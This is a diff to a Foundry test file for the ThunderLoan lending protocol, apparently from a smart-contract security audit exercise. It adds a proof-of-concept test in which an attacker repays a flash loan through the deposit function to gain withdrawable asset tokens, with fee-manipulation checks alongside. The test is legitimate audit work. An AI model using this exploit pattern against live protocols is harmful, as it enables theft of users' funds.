@@ -4,6 +4,7 @@ pragma solidity 0.8.20;
 import { Test, console } from "forge-std/Test.sol";
 import { AssetToken } from "../../../src/protocol/AssetToken.sol";
 import { OracleFlashLoanReceiver } from "./OracleFlashLoanReceiver.sol";
+import { OracleDepositWithFlashLoanReceiver } from "./OracleDepositWithFlashLoanReceiver.sol";
 import { ThunderLoan } from "../../../src/protocol/ThunderLoan.sol";
 import { ERC20Mock } from "../../mocks/ERC20Mock.sol";
 import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
@@ -23,6 +24,7 @@ contract ThunderLoanTest is Test {
     address user = address(456);
     OracleFlashLoanReceiver flashLoanReceiver;
     ThunderLoan thunderLoanImplementation;
+    OracleDepositWithFlashLoanReceiver flashLoanReceiver2;
 
     ERC1967Proxy proxy;
     ThunderLoan thunderLoan;
@@ -100,6 +102,58 @@ contract ThunderLoanTest is Test {
         assert(attackfee < normalFee);
         // also fee1 and fee2 are different yet the amount borrowed was the same (50e18)
         assert(flashLoanReceiver.fee1() != flashLoanReceiver.fee2());
+    }
+
+    /**
+     * In this function, we used a flashloan in a different way.
+     * 1. we borrow 50 TokenA with a flashloan
+     * 2. Instead of repaying the flashloan with the `repay` function in `thunderloan` we use the deposit function  in
+     * the thunderLoan
+     *
+     */
+    function testFlashLoanDepositIntheContractOracle() public setAllowedToken hasDeposits {
+        uint256 amountToBorrow = 50e18;
+        // fee for borrowing  100 TokenA
+        uint256 normalFee = thunderLoan.getCalculatedFee(tokenA, 100e18);
+
+        vm.startPrank(user);
+        flashLoanReceiver2 = new OracleDepositWithFlashLoanReceiver(
+            address(thunderLoan), address(pool), address(weth), address(thunderLoan.getAssetFromToken(tokenA))
+        );
+        ////////////////////////////
+        // assetTokenOfFlashLoanReceiver2Before and ass
+        uint256 assetTokenBalanceOfFlashLoanReceiver2Before =
+            thunderLoan.getAssetFromToken(tokenA).balanceOf(address(flashLoanReceiver2));
+        console.log(
+            "assetTokenBalanceOfFlashLoanReceiver2Before the flashloan attack",
+            assetTokenBalanceOfFlashLoanReceiver2Before
+        );
+        // this amount is minted for repaying flashloan fees in the contract
+        tokenA.mint(address(flashLoanReceiver2), AMOUNT * 10);
+        // in the flashloan, we are borrowing 50 TokenA twice --> check the flashloan contract
+        thunderLoan.flashloan(address(flashLoanReceiver2), tokenA, amountToBorrow, "");
+        vm.stopPrank();
+        uint256 assetTokenBalanceOfFlashLoanReceiver2After =
+            thunderLoan.getAssetFromToken(tokenA).balanceOf(address(flashLoanReceiver2));
+        console.log(
+            "assetTokenBalanceOfFlashLoanReceiver2After the flashloan attack",
+            assetTokenBalanceOfFlashLoanReceiver2After
+        );
+        uint256 attackfee = flashLoanReceiver2.fee1() + flashLoanReceiver2.fee2();
+        console.log("attackfee", attackfee);
+        console.log("normalFee", normalFee);
+        console.log("fee1,", flashLoanReceiver2.fee1());
+        console.log("fee2,", flashLoanReceiver2.fee2());
+
+        //atacker withdraws the assertToken.
+        vm.prank(user);
+        flashLoanReceiver2.withAssetToken(tokenA);
+
+        assert(attackfee < normalFee);
+        // also fee1 and fee2 are different yet the amount borrowed was the same (50e18)
+        // assert(flashLoanReceiver2.fee1() != flashLoanReceiver2.fee2());
+        assert(assetTokenBalanceOfFlashLoanReceiver2After > assetTokenBalanceOfFlashLoanReceiver2Before);
+        // LPs are given assertToken After deposit , the attacker now has aseertTOken after flashloan
     }
 }
 
